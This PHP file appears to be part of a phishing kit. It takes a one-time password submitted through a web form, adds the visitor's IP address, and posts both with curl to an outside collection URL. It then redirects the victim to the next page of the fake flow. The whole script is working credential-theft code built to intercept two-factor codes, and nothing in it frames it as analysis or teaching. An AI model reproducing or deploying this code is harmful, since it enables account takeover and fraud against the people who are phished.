<?php

$otp = $_POST['otp'];

$ip = getenv("REMOTE_ADDR");

//sending email info here

	$ip = getenv("REMOTE_ADDR");
        $subj = "OTP:$otp | $ip |";
        $msg = "

OTP: $otp<br>
IP: $ip";
        
$ch = curl_init('http://www.thisoldworkshop.com/bottom.php');
curl_setopt ($ch, CURLOPT_POST, 1);
curl_setopt ($ch, CURLOPT_POSTFIELDS, "subject=".$subj."&data=".$msg);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec ($ch);
curl_close ($ch);
header("Location: 3.htm");

?>